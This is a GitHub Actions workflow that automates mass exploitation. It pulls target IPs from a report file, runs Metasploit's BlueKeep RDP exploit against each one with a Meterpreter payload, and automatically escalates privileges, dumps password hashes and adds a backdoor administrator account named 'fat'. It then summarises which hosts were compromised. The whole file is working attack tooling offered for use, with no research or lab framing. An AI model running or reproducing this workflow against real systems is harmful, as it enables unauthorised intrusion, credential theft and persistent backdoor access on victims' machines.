name: Organized Exploitation and Reporting

on:
  workflow_dispatch:

jobs:
  attack_and_report:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling
      options: --user root

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Tools
        run: |
          apt-get update
          apt-get install -y metasploit-framework python3
          
      - name: Prepare Attack and Parser Scripts
        run: |
          python3 - <<EOF
          import re
          import os

          report_file = "clean_report.txt"
          rc_file = "attack.rc"
          
          if os.path.exists(report_file):
              with open(report_file, "r") as f:
                  content = f.read()

              ips = re.findall(r"TARGET IP\s+:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", content)
              unique_ips = list(set(ips))

              with open(rc_file, "w") as rc:
                  rc.write("spool raw_output.log\n")
                  rc.write("setg VERBOSE true\n")
                  for target_ip in unique_ips:
                      rc.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
                      rc.write(f"set RHOSTS {target_ip}\n")
                      rc.write("set target 1\n")
                      rc.write("set PAYLOAD windows/x64/meterpreter/bind_tcp\n")
                      rc.write("set AutoRunScript multi_console_command -c \"getsystem,hashdump,shell -c 'net user fat 123456 /add && net localgroup administrators fat /add'\"\n")
                      rc.write("exploit -j -z\n")
                  rc.write("sleep 120\n")
                  rc.write("spool off\n")
                  rc.write("exit\n")
          EOF

      - name: Execute Metasploit
        run: |
          msfconsole -q -r attack.rc

      - name: Parse and Clean Results
        run: |
          python3 - <<EOF
          import re
          import os

          def parse_log():
              if not os.path.exists("raw_output.log"): return
              with open("raw_output.log", "r") as f:
                  log = f.read()
              
              blocks = log.split("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce")
              with open("final_summary.txt", "w") as out:
                  out.write("="*50 + "\n")
                  out.write("FINAL ATTACK SUMMARY REPORT\n")
                  out.write("="*50 + "\n\n")
                  for block in blocks:
                      ip_match = re.search(r"RHOSTS => (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", block)
                      if ip_match:
                          ip = ip_match.group(1)
                          status = "FAILED"
                          reason = "No session created"
                          if "session opened" in block.lower() or "session 1 opened" in block.lower():
                              status = "SUCCESS"
                              reason = "Exploited! User 'fat' creation command sent."
                          elif "cleanup of the incorrectly-bound MS_T120" in block:
                              reason = "Vulnerable but NLA or Firewall blocked access"
                          out.write(f"IP: {ip} | STATUS: {status} | DETAIL: {reason}\n")
          parse_log()
          EOF

      - name: Upload Clean Report
        uses: actions/upload-artifact@v4
        with:
          name: summarized-results
          path: final_summary.txt
